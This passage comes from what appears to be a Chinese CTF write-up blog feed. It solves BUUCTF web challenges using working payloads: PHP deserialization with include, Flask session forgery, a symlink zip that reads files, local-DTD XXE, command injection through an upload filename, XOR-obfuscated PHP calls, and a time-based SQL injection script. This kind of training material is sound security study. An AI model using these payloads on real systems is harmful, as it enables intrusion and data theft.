</p><p>而且<code>llnn</code>那里，也就是Error类的第一个参数是可控的，所以可以这样：<code>?&gt;&lt;?=phpinfo();?&gt;</code>但有过滤，小括号和<code>/</code>都不能用，可以直接<code>include /flag</code>;将<code>/flag</code>url编码取反绕过</p><pre><code>php &gt; echo urlencode(~&#39;/flag&#39;);%D0%99%93%9E%98php &gt; echo ~urldecode(&#39;%D0%99%93%9E%98&#39;);/flag</code></pre><p>payload：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<span class="hljs-keyword">public</span> $syc;<span class="hljs-keyword">public</span> $lover;&#125;$str = <span class="hljs-string">&quot;?&gt;&lt;?=include~&quot;</span>.urldecode(<span class="hljs-string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="hljs-string">&quot;?&gt;&quot;</span>;<span class="hljs-keyword">echo</span> $str.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;$a=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>($str,<span class="hljs-number">1</span>);$b=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>($str,<span class="hljs-number">2</span>);<span class="hljs-keyword">echo</span> $a.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> $b.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;$c = <span class="hljs-keyword">new</span> SYCLOVER();$c-&gt;syc = $a;$c-&gt;lover = $b;<span class="hljs-keyword">echo</span>(urlencode(serialize($c))); <span class="hljs-meta">?&gt;</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SWPU2019 Web3</title>
    <link href="/2021/09/05/BUU92/"/>
    <url>/2021/09/05/BUU92/</url>
    
    <content type="html"><![CDATA[<h2 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h2><p>打开环境<br><img src="https://s3.bmp.ovh/imgs/2021/09/30ed24f91e126fbf.png"><br>随便登个admin  admin<br><img src="https://s3.bmp.ovh/imgs/2021/09/e5c98883e53ffd6e.png"><br>点击<code>upload</code>会得到<code>Permission denied!</code><br>注意到网站标题是<code>CTF-Flask-Demo</code>,所以去解一下session<br>解密脚本：</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><span class="hljs-comment"># flask-session-cookie-manager-master  也能解session</span><span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> zlib<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> session_json_serializer<span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decryption</span>(<span class="hljs-params">payload</span>):</span>    payload, sig = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)    payload, timestamp = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)    decompress = <span class="hljs-literal">False</span>    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">b&#x27;.&#x27;</span>):        payload = payload[<span class="hljs-number">1</span>:]        decompress = <span class="hljs-literal">True</span>    <span class="hljs-keyword">try</span>:        payload = base64_decode(payload)    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not base64 decode the payload because of &#x27;</span>                         <span class="hljs-string">&#x27;an exception&#x27;</span>)    <span class="hljs-keyword">if</span> decompress:        <span class="hljs-keyword">try</span>:            payload = zlib.decompress(payload)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not zlib decompress the payload before &#x27;</span>                             <span class="hljs-string">&#x27;decoding the payload&#x27;</span>)    <span class="hljs-keyword">return</span> session_json_serializer.loads(payload)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    print(decryption(sys.argv[<span class="hljs-number">1</span>].encode()))</code></pre><pre><code>PS D:\Users\L--N\Desktop\FILES\py\some&gt; python session_de.py .eJyrVspMUbKqVlJIUrJS8g1xLFeq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFxjxhY.YTTKww.1GFMAbE2U50IAvkhmpCtlVyULYg&#123;&#39;id&#39;: b&#39;100&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;</code></pre><p>之后伪造cookie,让id为<code>b&#39;1&#39;</code>,需要key</p><p>然后，如果访问网站不存在的路由会返回<code>404 not found</code>但status是200，在响应头里有：<code>Swpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg==</code></p><p>base64解码后得到：<code>SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</code>    </p><p>然后用<code>flask-session-cookie-manager</code>加密即可</p><pre><code>PS D:\Users\L--N\Desktop\FILES\flask-session-cookie-manager-master&gt; python .\flask_session_cookie_manager3.py encode -s &#39;keyqqqwwweee!@#$%^&amp;*&#39; -t &quot;&#123;&#39;id&#39;: b&#39;1&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;&quot;.eJyrVspMUbKqVlJIUrJS8g20tVWq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFiyxgX.YTTLwQ.WmaEwPJAp37kCXwjJt6tSxM9prM</code></pre><p><code>/upload</code>页面更换cookie</p><p><img src="https://s3.bmp.ovh/imgs/2021/09/a488570f16605e2e.png">    </p><p>得到文件上传的页面，且注释中有源码</p><pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/upload&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span>():</span>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;id&#x27;</span>] != <span class="hljs-string">b&#x27;1&#x27;</span>:        <span class="hljs-keyword">return</span> render_template_string(temp)    <span class="hljs-keyword">if</span> request.method==<span class="hljs-string">&#x27;POST&#x27;</span>:        m = hashlib.md5()        name = session[<span class="hljs-string">&#x27;password&#x27;</span>]        name = name+<span class="hljs-string">&#x27;qweqweqwe&#x27;</span>        name = name.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)        m.update(name)        md5_one= m.hexdigest()        n = hashlib.md5()        ip = request.remote_addr        ip = ip.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)        n.update(ip)        md5_ip = n.hexdigest()        f=request.files[<span class="hljs-string">&#x27;file&#x27;</span>]        basepath=os.path.dirname(os.path.realpath(__file__))        path = basepath+<span class="hljs-string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="hljs-string">&#x27;/&#x27;</span>+md5_one+<span class="hljs-string">&#x27;/&#x27;</span>+session[<span class="hljs-string">&#x27;username&#x27;</span>]+<span class="hljs-string">&quot;/&quot;</span>        path_base = basepath+<span class="hljs-string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="hljs-string">&#x27;/&#x27;</span>        filename = f.filename        pathname = path+filename        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;zip&quot;</span> != filename.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">-1</span>]:            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;zip only allowed&#x27;</span>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path_base):            <span class="hljs-keyword">try</span>:                os.makedirs(path_base)            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path):            <span class="hljs-keyword">try</span>:                os.makedirs(path)            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(pathname):            <span class="hljs-keyword">try</span>:                f.save(pathname)            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>        <span class="hljs-keyword">try</span>:            cmd = <span class="hljs-string">&quot;unzip -n -d &quot;</span>+path+<span class="hljs-string">&quot; &quot;</span>+ pathname            <span class="hljs-keyword">if</span> cmd.find(<span class="hljs-string">&#x27;|&#x27;</span>) != <span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> cmd.find(<span class="hljs-string">&#x27;;&#x27;</span>) != <span class="hljs-number">-1</span>:waf()                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>            os.system(cmd)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>        unzip_file = zipfile.ZipFile(pathname,<span class="hljs-string">&#x27;r&#x27;</span>)        unzip_filename = unzip_file.namelist()[<span class="hljs-number">0</span>]        <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;is_login&#x27;</span>] != <span class="hljs-literal">True</span>:            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;not login&#x27;</span>        <span class="hljs-keyword">try</span>:            <span class="hljs-keyword">if</span> unzip_filename.find(<span class="hljs-string">&#x27;/&#x27;</span>) != <span class="hljs-number">-1</span>:                shutil.rmtree(path_base)                os.mkdir(path_base)                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>            image = <span class="hljs-built_in">open</span>(path+unzip_filename, <span class="hljs-string">&quot;rb&quot;</span>).read()            resp = make_response(image)            resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span>            <span class="hljs-keyword">return</span> resp        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            shutil.rmtree(path_base)            os.mkdir(path_base)            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;upload.html&#x27;</span>)<span class="hljs-meta">@app.route(&#x27;/showflag&#x27;)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">showflag</span>():</span>    <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span> == <span class="hljs-literal">False</span>:        image = <span class="hljs-built_in">open</span>(os.path.join(<span class="hljs-string">&#x27;./flag/flag.jpg&#x27;</span>), <span class="hljs-string">&quot;rb&quot;</span>).read()        resp = make_response(image)        resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span>        <span class="hljs-keyword">return</span> resp    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;can&#x27;t give you&quot;</span></code></pre><p>两个路由，第一个要求上传个图片压缩包，第二个说明flag在flask根目录下的flag里的flag.jpg中</p><p><code>showflag()</code>路由的<code>True==False</code>是恒<code>False</code>的，所以不能通过第二个路由拿到flag，这里通过第一个路由上传个软链接读取文件      </p><p><code>ln -s</code>是Linux的一种软连接，相当于Windows的快捷方式<br>比如</p><pre><code>┌──(root💀kali)-[~/桌面]└─# ln -s /etc/passwd test       </code></pre><p>打开<code>test</code>中就是<code>/etc/passwd</code>中的内容了        </p><p><code>/proc/self</code> 记录了系统运行的信息状态等,<code>cwd</code>指向当前进程运行目录的一个符号链接,即flask运行进程目录      </p><p>payload:   </p><pre><code>┌──(root💀kali)-[~]└─# ln -s /proc/self/cwd/flag/flag.jpg test┌──(root💀kali)-[~]└─# zip -ry test.zip test</code></pre><p>然后将<code>test.zip</code>上传即可得到flag<br><img src="https://s3.bmp.ovh/imgs/2021/09/f2435ead4e20cf6f.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>flask</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>flask</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bnv</title>
    <link href="/2021/08/01/BUU91/"/>
    <url>/2021/08/01/BUU91/</url>
    
    <content type="html"><![CDATA[<h2 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/08/5a5f87e50976a9cd.png"><br><code>submit</code>抓包   </p><pre><code>POST /api/search HTTP/1.1Host: c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-type: application/jsonContent-Length: 38Origin: http://c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cnConnection: closeReferer: http://c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cn/&#123;&quot;message&quot;:&quot;135601360123502401401250&quot;&#125;       </code></pre><p><code>json</code><br>尝试sqli，不行<br>有json的地方可能存在<code>xxe</code><br><code>Content-type</code>改为<code>application/xml</code>   </p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [&lt;!ELEMENT message (#PCDATA)&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;&lt;message&gt;&amp;xxe;&lt;/message&gt;</code></pre><p>返回<code>No result found</code>     </p><p>看来不行    </p><p>WP：</p><p><a href="https://www.dazhuanlan.com/xlllovelife/topics/1220539"><code>利用本地DTD文件进行XXE</code></a>       </p><p>payload:</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message[    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;    &lt;!ENTITY % ISOamso &#39;    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///aaaaa/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;    &amp;#x25;eval;    &amp;#x25;error;&#39;&gt;%local_dtd;]&gt;</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>xxe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>xxe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Eating_cms</title>
    <link href="/2021/08/01/BUU90/"/>
    <url>/2021/08/01/BUU90/</url>
    
    <content type="html"><![CDATA[<h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><h4 id="parse-url-解析漏洞"><a href="#parse-url-解析漏洞" class="headerlink" title="parse_url()解析漏洞"></a><code>parse_url()</code>解析漏洞</h4><ul><li><p><code>function.php</code>中</p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;    $keywords = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>];    $uri = parse_url($_SERVER[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);    parse_str($uri[<span class="hljs-string">&#x27;query&#x27;</span>], $query);<span class="hljs-comment">//    var_dump($query);</span><span class="hljs-comment">//    die();</span>    <span class="hljs-keyword">foreach</span>($keywords <span class="hljs-keyword">as</span> $token)    &#123;        <span class="hljs-keyword">foreach</span>($query <span class="hljs-keyword">as</span> $k =&gt; $v)        &#123;            <span class="hljs-keyword">if</span> (stristr($k, $token))                hacker();            <span class="hljs-keyword">if</span> (stristr($v, $token))                hacker();        &#125;    &#125;&#125;</code></pre><p><code>http://675a4ec5-c964-4b92-a667-7415df780f0f.node4.buuoj.cn/user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code></p><p>这样就会被匹配到，不能读取；但是如果这样<code>///user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code>parse_url就会返回<code>false</code>；读取成功。</p><p><img src="https://ftp.bmp.ovh/imgs/2021/08/777d762da5a7bc08.png"></p><p><strong>漏洞问题只存在于php5.4.7以前</strong></p><hr><p>真正的上传地址<code>http://675a4ec5-c964-4b92-a667-7415df780f0f.node4.buuoj.cn/user.php?page=m4aaannngggeee</code></p><pre><code class="hljs php"><span class="hljs-comment">//upllloadddd.php</span><span class="hljs-meta">&lt;?php</span>$allowtype = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>);$size = <span class="hljs-number">10000000</span>;$path = <span class="hljs-string">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;$filename = $_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<span class="hljs-keyword">if</span>(is_uploaded_file($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]))&#123;    <span class="hljs-keyword">if</span>(!move_uploaded_file($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],$path.$filename))&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:can not move&quot;</span>);    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:not an upload file！&quot;</span>);&#125;$newfile = $path.$filename;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;file upload success&lt;br /&gt;&quot;</span>;<span class="hljs-keyword">echo</span> $filename;$picdata = system(<span class="hljs-string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.$filename.<span class="hljs-string">&quot; | base64 -w 0&quot;</span>);  <span class="hljs-comment">//system命令执行，抓包改filename即可</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.$picdata.<span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<span class="hljs-keyword">if</span>($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]&gt;<span class="hljs-number">0</span>)&#123;    unlink($newfile);    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file error: &quot;</span>);&#125;$ext = array_pop(explode(<span class="hljs-string">&quot;.&quot;</span>,$_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]));<span class="hljs-keyword">if</span>(!in_array($ext,$allowtype))&#123;    unlink($newfile);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>payload：</p><blockquote><p><code>;cd ..;ls;#</code></p><p><code>;cd ..;cat flag_233333;#</code></p><p><strong><strong>****</strong></strong>或者*<strong><strong><strong><strong><strong>****</strong></strong></strong></strong></strong></p><pre><code class="hljs php">|| `<span class="hljs-keyword">echo</span> bHMgLw== |base64 -d`ls /|| `<span class="hljs-keyword">echo</span> Y2F0IC9mbGFnXzIzMzMzMyA= |base64 -d` cat /flag_233333</code></pre></blockquote></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>rce</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>异或^</title>
    <link href="/2021/07/14/%E5%BC%82%E6%88%96/"/>
    <url>/2021/07/14/%E5%BC%82%E6%88%96/</url>
    
    <content type="html"><![CDATA[<h1 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h1><p>异或就是二进制对应位上运算：   </p><pre><code>1^1=0  1^0=10^0=0   </code></pre><p>%ff对应的是十进制的255，二进制就是<code>111111111</code>,所以它与其他异或后再与原来的异或就等于原来的<br><img src="https://ftp.bmp.ovh/imgs/2021/07/a92fa8f2e18a60bf.png">       </p><pre><code><pre><code class="hljs python">res=<span class="hljs-string">&#x27;phpinfo&#x27;</span>     <span class="hljs-comment">##要异或的</span>temp=[]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:    temp.append(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i)),<span class="hljs-number">16</span>)^<span class="hljs-number">0xff</span>))<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> temp:    print(j.replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)print(<span class="hljs-string">&#x27;^&#x27;</span>+<span class="hljs-string">&#x27;%ff&#x27;</span>*<span class="hljs-built_in">len</span>(temp))</code></pre></code></pre><p><code>phpinfo</code>—-&gt;<code>%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff</code>—-&gt;payload:<code>((%8f%97%8f%96%91%99%90)^(%ff%ff%ff%ff%ff%ff%ff))();</code>(每一部分都要括起来)     </p><h2 id="有字符长度限制的话"><a href="#有字符长度限制的话" class="headerlink" title="有字符长度限制的话"></a>有字符长度限制的话</h2><p>比如:    </p><pre><code><pre><code class="hljs php"><span class="hljs-keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="hljs-number">0x3</span>)) &gt; <span class="hljs-number">0xd</span> )    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;you are so close, omg&#x27;</span>);</code></pre></code></pre><p>这个是限定所用的字符种类小于或等于13       </p><p>看看有没有那个字符可以由其它的异或而来    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/abd98b027f2cf77f.png">      </p><pre><code><pre><code class="hljs python">res=<span class="hljs-string">&#x27;\&#x27;().;_acdinprst&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> res:        <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> res:            <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> res:                <span class="hljs-keyword">if</span>(<span class="hljs-built_in">ord</span>(j)^<span class="hljs-built_in">ord</span>(m)^<span class="hljs-built_in">ord</span>(n)==<span class="hljs-built_in">ord</span>(i)):                    <span class="hljs-keyword">if</span>(j==m <span class="hljs-keyword">or</span> j==n <span class="hljs-keyword">or</span> m==n):                        <span class="hljs-keyword">continue</span>                    <span class="hljs-keyword">else</span>:                        print(i+<span class="hljs-string">&#x27;==&#x27;</span>+j+<span class="hljs-string">&#x27;^&#x27;</span>+m+<span class="hljs-string">&#x27;^&#x27;</span>+n)</code></pre></code></pre><p>这里用三个来异或一个，两个的话太少，不行<br><img src="https://ftp.bmp.ovh/imgs/2021/07/cf8c1d80d192df60.png">        </p><p>随便选三个   </p><pre><code>c==d^n^id==c^i^ni==c^n^dc^%ff===d^n^i^%ff===d^%ff^n^%ff^i^%ff</code></pre><p><code>print_r</code>—&gt;<code>(%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)</code>—-&gt;加上两串<code>(%ff%ff%ff%ff%ff%ff%ff)</code>—&gt;<code>(%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff)</code>—–&gt;将对应位置上的字符修改，比如<code>i</code>在第三位，就把前三串的第三位改成<code>c n d</code>对应的<code>%9c %91 %9b</code>—-&gt;<code>(%8f%8d%9c%91%8b%a0%8d)^(%ff%ff%91%ff%ff%ff%ff)^(%ff%ff%9b%ff%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff)</code>    </p><p>scandir也换后     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/7f460d9d7f5b74e8.png">   </p><p>原本十五个，加上<code>%ff</code>，十六个，减三，十三个</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>or^or</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>knowledge</tag>
      
      <tag>or^or</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2021/07/11/BUU89/"/>
    <url>/2021/07/11/BUU89/</url>
    
    <content type="html"><![CDATA[<hr><p>title:  [SWPU2019]Web4<br>date:  2021-07-11 22:58:38<br>tags:  [CTF,WP,sql]<br>categories:  [CTF,sql]<br>index_img:  /img/0016.png<br>banner_img:  /img/0015.jpg</p><hr><h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>打开是一个登录框<br><img src="https://ftp.bmp.ovh/imgs/2021/07/29b0021639f71a2e.png">      </p><p>burp抓包加个<code>&#39;</code>发现报错<br><img src="https://ftp.bmp.ovh/imgs/2021/07/f58c9b6d66785aff.png">     </p><p>sql注入了，不过报错显示的是<code>fetch()</code>函数错误     </p><p><a href="https://xz.aliyun.com/t/3950"><code>PDO下的SQL注入</code></a><br>PDO—&gt;php数据对象       </p><p>PDO支持多语句执行，也就是堆叠注入      </p><p>PDO中的query()函数同数据库交互</p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$dbms=<span class="hljs-string">&#x27;mysql&#x27;</span>;$host=<span class="hljs-string">&#x27;192.168.27.61&#x27;</span>;$dbName=<span class="hljs-string">&#x27;test&#x27;</span>;$user=<span class="hljs-string">&#x27;root&#x27;</span>;$pass=<span class="hljs-string">&#x27;root&#x27;</span>;$dsn=<span class="hljs-string">&quot;<span class="hljs-subst">$dbms</span>:host=<span class="hljs-subst">$host</span>;dbname=<span class="hljs-subst">$dbName</span>&quot;</span>;<span class="hljs-keyword">try</span> &#123;    $pdo = <span class="hljs-keyword">new</span> PDO($dsn, $user, $pass);&#125; <span class="hljs-keyword">catch</span> (PDOException $e) &#123;    <span class="hljs-keyword">echo</span> $e;&#125;$sql = <span class="hljs-string">&quot;select * from user where id=1;&quot;</span>;$sql .= <span class="hljs-string">&quot;create table test2 like user&quot;</span>;$stmt = $pdo-&gt;query($sql);<span class="hljs-keyword">while</span>($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))&#123;    var_dump($row);    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;&#125;</code></pre></code></pre><p>prepare预处理      </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/fb83bbb774d5c639.png">      </p><p>以此结合十六进制注入    </p><p>找了WP的脚本，但跑不出来-_-</p><pre><code><pre><code class="hljs python">    <span class="hljs-comment">#author: c1e4r</span>    <span class="hljs-keyword">import</span> requests    <span class="hljs-keyword">import</span> json    <span class="hljs-keyword">import</span> time    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>        <span class="hljs-comment">#题目地址</span>        url = <span class="hljs-string">&#x27;&#x27;&#x27;http://568215bc-57ff-4663-a8d9-808ecfb00f7f.node3.buuoj.cn/index.php?r=Login/Login&#x27;&#x27;&#x27;</span>        <span class="hljs-comment">#注入payload</span>        payloads = <span class="hljs-string">&quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;</span>        flag = <span class="hljs-string">&#x27;&#x27;</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):            <span class="hljs-comment">#查询payload</span>            payload = <span class="hljs-string">&quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">128</span>):                <span class="hljs-comment">#将构造好的payload进行16进制转码和json转码</span>                datas = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payloads.<span class="hljs-built_in">format</span>(str_to_hex(payload.<span class="hljs-built_in">format</span>(i,j))),<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;test213&#x27;</span>&#125;                data = json.dumps(datas)                times = time.time()                res = requests.post(url = url, data = data)                <span class="hljs-keyword">if</span> time.time() - times &gt;= <span class="hljs-number">3</span>:                    flag = flag + <span class="hljs-built_in">chr</span>(j)                    print(flag)                    <span class="hljs-keyword">break</span>    <span class="hljs-function"><span 